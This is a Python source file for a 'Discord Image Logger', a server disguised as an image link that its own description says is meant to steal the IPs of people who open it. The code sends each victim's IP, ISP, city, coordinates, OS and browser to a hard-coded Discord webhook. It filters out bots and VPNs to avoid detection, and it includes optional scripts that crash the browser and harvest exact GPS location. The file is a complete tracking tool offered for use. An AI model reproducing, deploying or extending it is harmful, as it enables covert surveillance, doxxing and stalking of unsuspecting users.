
# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discordapp.com/api/webhooks/1491599076809244772/2SlpguSr5SWJVdE1PncxbmdzGs3DLKMMUz3iFIJHz8dpk3wg3tY_Gm-BChAZo7VC3hUE",
    "image": "data:image/png;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
